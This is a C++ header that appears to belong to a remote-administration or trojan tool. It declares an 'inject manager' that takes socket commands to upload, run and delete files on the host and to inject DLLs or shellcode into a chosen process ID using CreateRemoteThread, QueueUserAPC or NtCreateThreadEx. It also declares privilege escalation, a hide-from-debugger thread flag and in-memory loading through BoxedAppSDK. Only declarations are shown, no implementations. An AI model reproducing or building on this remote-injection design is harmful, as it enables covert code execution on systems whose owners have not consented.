#pragma once
#include "Manager.h"
#include <string>
#include <map>
#include "MemoryModule.h"
#include "BoxedAppSDK.h"

enum
{
	TOKEN_INJECT_MSG,
	TOKEN_INJECT_PROCESS,
	TOKEN_INJECT_STARTSEND,
	COMMAND_INJECT_PROCESS,
	COMMAND_INJECT_FILE_INFO,
	COMMAND_INJECT_FILE_DATA,
	COMMAND_INJECT_FILE_SENDOK,
	COMMAND_INJECT_REMOTEFILE_RUN,
	COMMAND_INJECT_REMOTEFILE_DEL,
	COMMAND_INJECT_MODE,
	COMMAND_INJECT_SETDLL,
	COMMAND_INJECT_REMOTEFILE_RUN_ARG,
};

enum injectmode
{
	MODE_CreateRemoteThread_dll,
	MODE_CreateRemoteThread_shellcode,
	MODE_QueueUserAPC_dll,
	MODE_QueueUserAPC_shellcode,
	MODE_NtCreateThreadEx_dll,
	MODE_NtCreateThreadEx_shellcode,
};


typedef void(__stdcall* fuBoxedAppSDK_SetContext)(LPCSTR szContext);
typedef BOOL(__stdcall* fuBoxedAppSDK_Init)();
typedef BOOL(__stdcall* fuBoxedAppSDK_SetBxSdkRawData)(PVOID pData, DWORD dwSize);
typedef void(__stdcall* fuBoxedAppSDK_Exit)();
typedef HANDLE(__stdcall* fuBoxedAppSDK_CreateVirtualFileW)(LPCWSTR szPath, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
typedef DWORD(__stdcall* fuBoxedAppSDK_DeleteFileFromVirtualFileSystemW)(LPCWSTR szPath);
typedef void(__stdcall* fuBoxedAppSDK_EnableOption)(DWORD dwOptionIndex, BOOL bEnable);
typedef void(__stdcall* fuBoxedAppSDK_RemoteProcess_EnableOption)(DWORD dwProcessId, DWORD dwOptionIndex, BOOL bEnable);
typedef BOOL(__stdcall* fuBoxedAppSDK_AttachToProcess)(HANDLE hProcess);
typedef BOOL(__stdcall* fuBoxedAppSDK_DetachFromProcess)(HANDLE hProcess);
typedef void(__stdcall* fuBoxedAppSDK_EmulateBoxedAppSDKDLL)();
typedef BOOL(__stdcall* fuBoxedAppSDK_SetBxSdk64DllPathW)(LPCWSTR szPath);
typedef BOOL(__stdcall* fuBoxedAppSDK_SetBxSdk32DllPathW)(LPCWSTR szPath);
typedef void(__stdcall* fuBoxedAppSDK_EnableDebugLog)(BOOL bEnable);



typedef std::map<DWORD, std::wstring*> PidandStitle; //进程ID与窗口名
#define MAKE_PAIR(_a,b,c) _a::value_type((b),(c))
struct FILEINFO
{
	int SendFileLength; // 文件总大小
	TCHAR m_SendName[MAX_PATH];	//上传文件名
};

struct INJECTMODE
{
	injectmode einjectmode; //注入模式
	TCHAR DllName[MAX_PATH]; //注入文件名
	int Dlllen;				//DLL大小
	DWORD dwProcessID;		//被注入进程ID
	BOOL DllIsx86;			//DLL是不是32位
	BOOL ExeIsx86;			//进程是不是32位
	TCHAR WritePath[MAX_PATH];//写出DLL完整路径
};

class CInjectManager : public CManager
{
public:
	BOOL m_buser;
	CInjectManager(ISocketBase* pClient);
	virtual ~CInjectManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
private:
	HMEMORYMODULE handle;
	fuBoxedAppSDK_SetContext MyBoxedAppSDK_SetContext;
	fuBoxedAppSDK_Init MyBoxedAppSDK_Init;
	fuBoxedAppSDK_SetBxSdkRawData MyBoxedAppSDK_SetBxSdkRawData;
	fuBoxedAppSDK_Exit MyBoxedAppSDK_Exit;
	fuBoxedAppSDK_CreateVirtualFileW MyBoxedAppSDK_CreateVirtualFileW;
	fuBoxedAppSDK_DeleteFileFromVirtualFileSystemW MyBoxedAppSDK_DeleteFileFromVirtualFileSystemW;
	fuBoxedAppSDK_EnableOption MyBoxedAppSDK_EnableOption;
	fuBoxedAppSDK_RemoteProcess_EnableOption MyBoxedAppSDK_RemoteProcess_EnableOption;
	fuBoxedAppSDK_AttachToProcess MyBoxedAppSDK_AttachToProcess;
	fuBoxedAppSDK_DetachFromProcess MyBoxedAppSDK_DetachFromProcess;
	fuBoxedAppSDK_EmulateBoxedAppSDKDLL MyBoxedAppSDK_EmulateBoxedAppSDKDLL;
	fuBoxedAppSDK_SetBxSdk64DllPathW MyBoxedAppSDK_SetBxSdk64DllPathW;
	fuBoxedAppSDK_SetBxSdk32DllPathW MyBoxedAppSDK_SetBxSdk32DllPathW;
	fuBoxedAppSDK_EnableDebugLog MyBoxedAppSDK_EnableDebugLog;
private:
	void SendProcessList();
	LPBYTE getProcessList();	//进程
	BOOL DebugPrivilege(const TCHAR* PName, BOOL bEnable);
	BOOL GetProcessUserName(HANDLE hProcess, TCHAR* strProcessUser);
	BOOL DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath);
	bool Is64BitPorcess(DWORD dwProcessID);
	bool Is64BitOS();
	void SendError(TCHAR* Terror);

	void CreateLocalRecvFile(LPBYTE lpBuffer);
	void WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize);
	void WriteOk();
	void WriteDllandSetPath(BOOL isx86, TCHAR* lpBuffer);
	TCHAR szPath_dll32[MAX_PATH];
	TCHAR szPath_dll64[MAX_PATH];
	PBYTE RecvDate;
	DWORD offsetsize;		//发生偏移
	BOOL ClientIsx86;
	INJECTMODE m_sinjectmode;
	FILEINFO m_fileinfo;
	BOOL BoxedAppSDK_Init_IsOK;
	BYTE* bxsdkbyte;
	void RunExe(LPBYTE lpBuffer);
	void RunExeuacArg(LPBYTE lpBuffer);
	void DelFile(LPBYTE lpBuffer);
	void Inject_dll();
	void Inject_shellcode();
	DWORD Flags ;

};

#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED	0x00000001
#define THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH  0x00000002
#define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER	0x00000004

//// 现在记事本加载虚拟文件
//WinExec("notepad.exe 1.txt", SW_SHOW);





